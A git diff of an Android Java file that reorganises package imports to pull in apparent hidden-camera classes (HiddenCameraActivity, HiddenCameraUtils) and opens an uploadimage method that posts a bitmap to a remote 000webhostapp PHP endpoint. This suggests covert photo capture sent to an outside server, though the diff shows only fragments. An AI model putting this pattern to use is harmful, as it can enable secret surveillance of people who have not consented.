@@ -1,6 +1,10 @@
-package com.example.myapplication;
+package View;
 
-import Config.*;
+import Controler.CameraConfiguration.*;
+import Model.CameraConfig;
+import Model.CameraError;
+import Model.HiddenCameraActivity;
+import Model.HiddenCameraUtils;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.Intent;
@@ -8,7 +12,6 @@ import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.os.Bundle;
-import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
 import android.view.View;
@@ -17,12 +20,12 @@ import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 
 import com.android.volley.AuthFailureError;
-import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.RequestQueue;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
+import com.example.myapplication.R;
 import okhttp3.*;
 import org.jetbrains.annotations.NotNull;
 import org.json.JSONException;
@@ -251,14 +254,11 @@ else
 
 
 
-
+                                                /////////Image to server
 
     public  void uploadimage(final Bitmap bitmap)
 
     {
-
-
-
 
         String upload_image_url="https://project-daudi.000webhostapp.com/android_login_register/upload_image.php";
         final StringRequest stringrequest = new StringRequest(com.android.volley.Request.Method.POST, upload_image_url,
